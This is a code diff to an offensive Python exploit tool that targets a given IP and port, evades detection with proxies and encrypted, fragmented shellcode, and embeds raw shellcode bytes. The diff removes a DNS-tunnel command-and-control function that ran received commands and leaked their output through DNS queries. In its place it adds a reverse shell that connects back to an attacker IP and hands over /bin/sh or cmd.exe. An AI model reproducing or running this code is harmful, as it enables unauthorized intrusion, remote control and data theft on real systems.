@@ -7,7 +7,11 @@ import subprocess
 import sys
 import os
 import base64
-import ssl  # Added missing import
+import ssl
+# Removed problematic DNS imports causing script failures
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 
 # Command-line arguments
 if len(sys.argv) not in (5, 6):
@@ -22,8 +26,6 @@ TARGET_PORT = int(sys.argv[4])
 PLATFORM = sys.argv[5].lower() if len(sys.argv) >= 6 else "linux"
 MAX_THREADS = 8
 TRAFFIC_THROTTLE = 50  # Kbps max
-DNS_DOMAIN = "1dot1dot1dot1.cloudflare-dns.com"
-DNS_SERVER = "1.1.1.1"
 
 print(f"[*] Targeting {TARGET_IP}:{TARGET_PORT} ({PLATFORM}) with callback to {ATTACKER_IP}:{ATTACKER_PORT}")
 
@@ -66,7 +68,7 @@ class ProxyPool:
     
     def validate_proxy(self, proxy):
         """Check proxy functionality"""
-        parts = proxy.split(':', 1)  # Split only once for IPv6 compatibility
+        parts = proxy.split(':', 1)
         if len(parts) != 2:
             return False
             
@@ -288,7 +290,6 @@ class ExploitCore:
             encrypted_payload, key = self.evasion.encrypt_shellcode(payload)
             fragments = self.evasion.fragment_payload(encrypted_payload)
             
-            # Fixed: Correct list slicing syntax
             num_frags_phase1 = int(len(fragments) * 0.85)
             
             # Phase 1: Send 85% of payload
@@ -470,80 +471,12 @@ class ExploitCore:
                 b"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
             )
 
-def dns_tunnel_shell():
-    """Actual DNS covert channel for command and control"""
-    print(f"[*] Starting DNS tunnel to {DNS_DOMAIN}")
-    
-    # Sequence tracking for command/output correlation
-    command_id = 0
-    
-    while True:
-        try:
-            # Generate random subdomain for command request
-            rand_prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12))
-            query_name = f"{rand_prefix}.c.{DNS_DOMAIN}"
-            
-            # Create DNS query
-            query = dns.message.make_query(query_name, dns.rdatatype.TXT)
-            response = dns.query.udp(query, DNS_SERVER, timeout=5)
-            
-            # Extract command from TXT records
-            command = ""
-            for rrset in response.answer:
-                for record in rrset:
-                    if record.rdtype == dns.rdatatype.TXT:
-                        # Join and decode properly
-                        command_str = b''.join(record.strings).decode('utf-8', errors='ignore')
-                        if command_str:
-                            command = command_str
-                            break
-                if command:
-                    break
-            
-            if command:
-                print(f"[+] Received command: {command}")
-                
-                # Execute command
-                try:
-                    result = subprocess.check_output(
-                        command, 
-                        shell=True, 
-                        stderr=subprocess.STDOUT,
-                        timeout=30
-                    ).decode('utf-8', errors='ignore')
-                except subprocess.CalledProcessError as e:
-                    result = e.output.decode('utf-8', errors='ignore')
-                except Exception as e:
-                    result = str(e)
-                
-                # Fragment and send output via DNS queries
-                # Base32 encode to avoid invalid characters
-                encoded = base64.b32encode(result.encode()).decode().replace('=', '')
-                chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
-                for i, chunk in enumerate(chunks):
-                    output_domain = f"{chunk}.{i}.{command_id}.r.{DNS_DOMAIN}"
-                    
-                    # Send output via DNS query
-                    try:
-                        output_query = dns.message.make_query(output_domain, dns.rdatatype.A)
-                        dns.query.udp(output_query, DNS_SERVER, timeout=2)
-                    except:
-                        pass
-                    time.sleep(0.1)  # Avoid flooding
-            
-            command_id = (command_id + 1) % 1000
-            time.sleep(30)  # Check for commands every 30 seconds
-            
-        except Exception as e:
-            print(f"[!] DNS tunnel error: {str(e)}")
-            time.sleep(60)
-
 def monitor_success(engine):
     """Monitor for exploitation success"""
     start_time = time.time()
     while not engine.stop_event.is_set():
         if engine.success:
-            print("\n[+] Exploit succeeded! Establishing C2 channel...")
+            print("\n[+] Exploit succeeded!")
             engine.stop_event.set()
         
         # Timeout after 15 minutes
@@ -558,10 +491,6 @@ if __name__ == "__main__":
     stealth = StealthNetwork(proxy_pool)
     evasion = EvasionEngine()
     engine = ExploitCore(stealth, evasion, TARGET_IP, TARGET_PORT, ATTACKER_IP, ATTACKER_PORT)
-    
-    # Start DNS covert channel
-    dns_thread = threading.Thread(target=dns_tunnel_shell, daemon=True)
-    dns_thread.start()
     
     # Start monitoring
     monitor_thread = threading.Thread(target=monitor_success, args=(engine,), daemon=True)
@@ -600,13 +529,18 @@ if __name__ == "__main__":
         t.join(timeout=5)
         
     if engine.success:
-        print("\n[+] Covert access established via DNS tunnel")
-        print("[*] Use DNS queries for command and control")
-        # Keep main thread alive for DNS tunnel
+        print("\n[+] Exploit succeeded! Starting command shell")
+        # Start reverse shell instead of DNS tunnel
         try:
-            while True:
-                time.sleep(10)
-        except KeyboardInterrupt:
-            print("\n[!] Exiting...")
+            # Simple reverse shell connection
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ATTACKER_IP, ATTACKER_PORT))
+            os.dup2(s.fileno(), 0)
+            os.dup2(s.fileno(), 1)
+            os.dup2(s.fileno(), 2)
+            shell = "/bin/sh" if PLATFORM == "linux" else "cmd.exe"
+            subprocess.call([shell, "-i"])
+        except Exception as e:
+            print(f"\n[!] Failed to connect back: {str(e)}")
     else:
         print("\n[!] Operation completed without confirmed access")
